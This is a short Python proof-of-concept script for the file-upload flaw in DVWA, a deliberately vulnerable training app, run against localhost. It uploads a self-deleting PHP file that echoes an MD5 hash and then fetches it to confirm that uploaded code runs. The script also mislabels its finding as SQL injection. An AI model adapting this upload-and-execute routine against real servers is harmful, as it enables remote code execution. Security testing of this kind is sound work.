"""
 @Author: UpDown
 @FileName: dvwa_upload_poc.py
 @Time: 2022/5/8 23:04
"""

import random
import time
import hashlib

import requests

file_name = time.time_ns()


def write_file(rd):
    content = "<?php echo md5('{}'); unlink(__FILE__)?>".format(rd)
    with open("./php/{}.php".format(file_name), "w+") as f:
        f.write(content)



def upload_file(url):
    cookies = {
        'security': 'low',
        'csrftoken': '4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q',
        'PHPSESSID': 'ekn0c5tssdi0kl57bjgc8q2ql2',
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39'
    }
    # 挂上代理，查看请求是否出现问题
    proxies = {
        "http": "http://127.0.0.1:8080"
    }
    upload_file = open("./php/"+str(file_name)+'.php','rb')
    file = {'uploaded': upload_file,'Upload':(None,"Upload")} #None对应的是文件名，没有文件名，Upload对应的是值
    response = requests.post(url,files=file,headers=headers,cookies=cookies,proxies=proxies)
    # print(response.text)



def check_poc(url,file_name,md5_num):
    # ../../hackable/uploads/1.php
    cookies = {
        'security': 'low',
        'csrftoken': '4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q',
        'PHPSESSID': 'ekn0c5tssdi0kl57bjgc8q2ql2',
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39'
    }
    fin_url = url + "../../hackable/uploads/{}.php".format(file_name)
    r = requests.get(fin_url,headers=headers,cookies=cookies)
    print(r.text)
    if md5_num.hexdigest() in r.text:
        print("存在sql注入漏洞")

if __name__ == '__main__':
    num1 = str(random.random())
    md = hashlib.md5()
    md.update(num1.encode('utf-8'))
    # 第一步：先随机生成php脚本
    write_file(num1)
    url = "http://127.0.0.1/dvwa/vulnerabilities/upload/"
    # 第二步：上传php脚本
    upload_file(url)

    # 第三步：访问php脚本，判断是否存在且能否正常解析
    check_poc(url,str(file_name),md)


